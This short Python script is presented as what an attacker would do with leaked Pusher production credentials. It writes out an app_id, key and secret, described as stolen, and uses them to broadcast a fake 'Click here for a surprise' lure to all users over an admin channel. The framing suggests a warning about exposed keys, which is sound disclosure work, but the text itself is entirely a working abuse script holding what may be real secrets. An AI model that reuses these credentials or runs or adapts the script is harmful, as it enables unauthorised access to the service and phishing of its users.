# A simple Python script an attacker would use
from pusher import Pusher

# Using YOUR stolen production keys
p = Pusher(
  app_id='1922611',
  key='80236ec36aada60a8520',
  secret='cc41177d21551abf356d',
  cluster='us2',
  ssl=True
)

# Sending a fake message to all users
p.trigger('admin-channel', 'new-notification', {
    'message': 'How are you? Long time no see! Click here for a surprise.',
    'type': 'promo'
})